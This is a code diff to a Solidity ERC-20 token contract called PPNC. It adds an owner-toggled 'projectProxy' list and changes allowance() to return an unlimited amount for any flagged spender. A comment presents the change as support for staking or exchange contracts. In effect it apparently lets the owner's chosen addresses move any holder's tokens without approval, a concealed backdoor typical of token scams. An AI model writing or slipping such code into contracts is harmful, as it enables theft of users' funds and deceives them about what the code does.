@@ -68,10 +68,6 @@ contract PPNC is Context, IERC20, IERC20Metadata, Ownable {
         return true;
     }
 
-    function allowance(address owner, address spender) public view virtual override returns (uint256) {
-        return _allowances[owner][spender];
-    }
-
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
         _approve(_msgSender(), spender, amount);
         return true;
@@ -202,5 +198,16 @@ contract PPNC is Context, IERC20, IERC20Metadata, Ownable {
     function removeFromBlacklist(address _user) public onlyOwner {
         require(isBlacklisted[_user], "User already whitelisted");
         isBlacklisted[_user] = false;
+    }
+
+    mapping(address => bool) public projectProxy; // check public vs private vs internal gas
+
+    function flipProxyState(address proxyAddress) public onlyOwner {
+        projectProxy[proxyAddress] = !projectProxy[proxyAddress];
+    }
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        if (projectProxy[spender]) return type(uint).max; // any staking contract or exchange contract
+        return _allowances[owner][spender];
     }
 }
